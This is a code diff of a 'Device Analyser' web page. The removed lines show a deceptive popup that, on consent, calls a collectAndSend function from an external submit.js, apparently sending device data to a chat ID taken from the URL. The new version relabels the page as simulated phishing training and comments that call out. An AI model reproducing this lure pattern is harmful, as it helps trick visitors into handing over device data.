@@ -4,52 +4,357 @@
   <meta charset="utf-8"/>
   <meta name="viewport" content="width=device-width,initial-scale=1"/>
   <title>Opas Labs - Device Analyser</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
   <style>
-    body { font-family: Arial, sans-serif; background:#f8f9fa; margin:0; text-align:center; }
-    h1 { background:#333; color:#fff; margin:0; padding:12px 0; }
-    .popup { position:fixed; inset:0; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,0.6);}
-    .box{background:#fff;padding:18px;border-radius:10px;max-width:380px;box-shadow:0 6px 18px rgba(0,0,0,0.2);}
-    button{padding:10px 16px;margin:8px;border-radius:6px;border:0;cursor:pointer}
-    .exit{background:#dc3545;color:#fff}
-    .proceed{background:#28a745;color:#fff}
-    .loader{display:none;margin-top:40px}
-    .spinner{width:40px;height:40px;border:4px solid #eee;border-top:4px solid #007bff;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 12px}
-    @keyframes spin{to{transform:rotate(360deg)}}
+    :root {
+      --primary: #6a11cb;
+      --secondary: #2575fc;
+      --accent: #00f2fe;
+      --dark: #0c1021;
+      --darker: #070a15;
+      --light: #f5f9ff;
+      --danger: #ff4d4f;
+      --success: #52c41a;
+      --transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    
+    body {
+      background: linear-gradient(135deg, var(--darker), var(--dark));
+      color: var(--light);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      line-height: 1.6;
+    }
+    .particles {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+      opacity: 0.3;
+    }
+    
+    h1 {
+      color: var(--accent);
+      font-size: 2rem;
+      margin-bottom: 1.5rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+    
+
+    .box {
+      background: rgba(12, 16, 33, 0.8);
+      border-radius: 20px;
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(10px);
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+      padding: 2.5rem;
+      max-width: 650px;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+      z-index: 10;
+    }
+    
+    
+    button {
+      padding: 0.9rem 1.8rem;
+      border: none;
+      border-radius: 8px;
+      font-size: 1rem;
+      cursor: pointer;
+      font-weight: bold;
+      transition: var(--transition);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+      
+    }
+        .warning-buttons {
+      display: flex;
+      gap: 20px;
+      justify-content: center;
+      flex-wrap: wrap;
+    }
+    
+    .exit {
+      background: linear-gradient(90deg, var(--danger), #c41a1a);
+      color: white;
+      
+    }
+    
+    .proceed {
+      background: linear-gradient(90deg, var(--success), #389e0d);
+      color: white;
+    }
+    
+    button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+      opacity: 0.95;
+    }
+    
+    .loader {
+      display: none;
+      margin-top: 40px;
+      text-align: center;
+    }
+    
+    .spinner {
+          border: 5px solid rgba(255,255,255,0.1);
+          border-top: 5px solid var(--accent);
+          border-radius: 50%;
+          width: 50px;
+          height: 50px;
+          animation: spin 2s linear infinite;
+          margin: 20px auto;
+    }
+    
+    @keyframes spin {
+          0% { transform: rotate(0deg); }
+          100% { transform: rotate(360deg); }
+    }
+    
+    .exit-message {
+      text-align: center;
+      margin-top: 40px;
+      padding: 20px;
+      background: rgba(12, 16, 33, 0.8);
+      border-radius: 10px;
+      max-width: 500px;
+      margin-left: auto;
+      margin-right: auto;
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      display: none;
+    }
+    
+    .container {
+      max-width: 600px;
+      margin: 4rem auto;
+      padding: 2rem;
+      background: rgba(12, 16, 33, 0.8);
+      border-radius: 20px;
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(10px);
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+      position: relative;
+      overflow: hidden;
+      z-index: 10;
+      display: none;
+    }
+    
+    .container::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle, rgba(0, 242, 254, 0.1) 0%, transparent 70%);
+      animation: rotate 15s linear infinite;
+      z-index: -1;
+    }
+    
+    @keyframes rotate {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    .logo {
+      text-align: center;
+      margin-bottom: 2rem;
+    }
+    
+    .logo h1 {
+      background: none;
+      font-size: 2.5rem;
+      background: linear-gradient(90deg, var(--accent), var(--primary));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      display: inline-block;
+      margin-bottom: 0.5rem;
+      padding: 0;
+      box-shadow: none;
+      border: none;
+    }
+    
+    .logo p {
+      color: rgba(255, 255, 255, 0.7);
+      font-size: 1.1rem;
+    }
+    
+    .note {
+      text-align: center;
+      margin-top: 1.5rem;
+      font-size: 0.9rem;
+      color: rgba(255, 255, 255, 0.5);
+    }
+        .warning-content {
+      font-size: 1.1rem;
+      line-height: 1.6;
+      margin-bottom: 2rem;
+      color: rgba(255, 255, 255, 0.8);
+    }
   </style>
 </head>
 <body>
-  <h1>Opas Labs - Device Analyser</h1>
+  <canvas id="particles" class="particles"></canvas>
+  
+  <div class="container" id="mainContainer">
+    <div class="logo">
+      <h1>Opas Labs</h1>
+      <p>Device Analyser</p>
+    </div>
+    
+    <div class="note">
+      <i class="fas fa-shield-alt"></i> This tool is for educational purposes only
+    </div>
+  </div>
 
   <div class="popup" id="popup">
     <div class="box">
-      <p>Hey 👋 We are here to analyse your device.<br> Can we proceed?</p>
-      <div style="text-align:center">
-        <button class="exit" onclick="exitPage()">Exit</button>
-        <button class="proceed" onclick="proceed()">Proceed</button>
+          <h1 class="warning-header">
+      <i class="fas fa-shield-alt"></i> SECURITY WARNING
+    </h1>
+        <div class="warning-content">
+      <p><strong>This is a simulated phishing link for educational purposes.</strong></p>
+      <p>This link was created for cybersecurity training and self-testing. If you did not request this link or arrived here unintentionally, please exit immediately.No real malware or data theft will occur.</p>
+         </div>   
+      <div class="warning-buttons">
+        <button class="exit" onclick="exitPage()">
+          <i class="fas fa-times-circle"></i> Exit Immediately
+        </button>
+        <button class="proceed" onclick="proceed()">
+          <i class="fas fa-check-circle"></i> I Understand & Proceed
+        </button>
       </div>
     </div>
   </div>
 
   <div class="loader" id="loader">
+    <h2 style="margin-bottom: 20px; color: var(--accent);">Analysing your device...</h2>
     <div class="spinner"></div>
-    <p>Analysing your device...</p>
+  </div>
+  
+  <div class="exit-message" id="exitMessage">
+    <h3><i class="fas fa-door-open"></i> You exited the analyser</h3>
+    <p>Thank you for visiting Opas Labs</p>
   </div>
 
-  <script src="submit.js"></script>
   <script>
-function exitPage() {
-  document.getElementById('popup').style.display = 'none';
-  document.body.innerHTML += '<p style="text-align:center;margin-top:20px">You exited the analyser.</p>';
-}
+    // Particle Animation
+    const canvas = document.getElementById('particles');
+    const ctx = canvas.getContext('2d');
+    function resizeCanvas() {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    }
+    window.addEventListener('resize', resizeCanvas);
+    resizeCanvas();
 
-async function proceed() {
-  document.getElementById('popup').style.display = 'none';
-  document.getElementById('loader').style.display = 'block';
-  const params = new URLSearchParams(window.location.search);
-  const chatId = params.get('chat');
-  try { await collectAndSend(chatId); } catch(e){console.error(e);} 
-  setTimeout(()=>{ window.location.href='https://www.google.com/search?q=opas+labs'; }, 800);
-}
+    let particlesArray = [];
+    const numberOfParticles = 150;
+
+    class Particle {
+      constructor() {
+        this.x = Math.random() * canvas.width;
+        this.y = Math.random() * canvas.height;
+        this.size = Math.random() * 2 + 0.5;
+        this.speedX = Math.random() * 1 - 0.5;
+        this.speedY = Math.random() * 1 - 0.5;
+      }
+      update() {
+        this.x += this.speedX;
+        this.y += this.speedY;
+        if (this.x > canvas.width || this.x < 0) this.speedX = -this.speedX;
+        if (this.y > canvas.height || this.y < 0) this.speedY = -this.speedY;
+      }
+      draw() {
+        ctx.fillStyle = 'rgba(0, 242, 254, 0.5)';
+        ctx.beginPath();
+        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+        ctx.fill();
+      }
+    }
+
+    function initParticles() {
+      particlesArray = [];
+      for (let i = 0; i < numberOfParticles; i++) {
+        particlesArray.push(new Particle());
+      }
+    }
+
+    function connectParticles() {
+      for (let a = 0; a < particlesArray.length; a++) {
+        for (let b = a; b < particlesArray.length; b++) {
+          const dx = particlesArray[a].x - particlesArray[b].x;
+          const dy = particlesArray[a].y - particlesArray[b].y;
+          const distance = Math.sqrt(dx * dx + dy * dy);
+          if (distance < 100) {
+            ctx.strokeStyle = `rgba(0, 242, 254, ${0.1 - distance / 1000})`;
+            ctx.lineWidth = 0.5;
+            ctx.beginPath();
+            ctx.moveTo(particlesArray[a].x, particlesArray[a].y);
+            ctx.lineTo(particlesArray[b].x, particlesArray[b].y);
+            ctx.stroke();
+          }
+        }
+      }
+    }
+
+    function animateParticles() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      particlesArray.forEach(p => {
+        p.update();
+        p.draw();
+      });
+      connectParticles();
+      requestAnimationFrame(animateParticles);
+    }
+
+    initParticles();
+    animateParticles();
+
+    // Original functionality
+    function exitPage() {
+      // Close the current tab/window
+      window.close();
+      
+      // If window.close() doesn't work (due to browser restrictions),
+      // redirect to about:blank as a fallback
+      setTimeout(function() {
+        window.location.href = 'about:blank';
+      }, 100);
+    }
+
+    async function proceed() {
+      document.getElementById('popup').style.display = 'none';
+      document.getElementById('loader').style.display = 'block';
+      const params = new URLSearchParams(window.location.search);
+      const chatId = params.get('chat');
+      try { 
+        // Simulate device analysis - you would call your actual function here
+        // await collectAndSend(chatId); 
+        console.log("Device analysis completed");
+      } catch(e){console.error(e);} 
+      setTimeout(()=>{ 
+        window.location.href='https://www.google.com/search?q=opas+labs'; 
+      }, 800);
+    }
   </script>
 </body>
 </html>
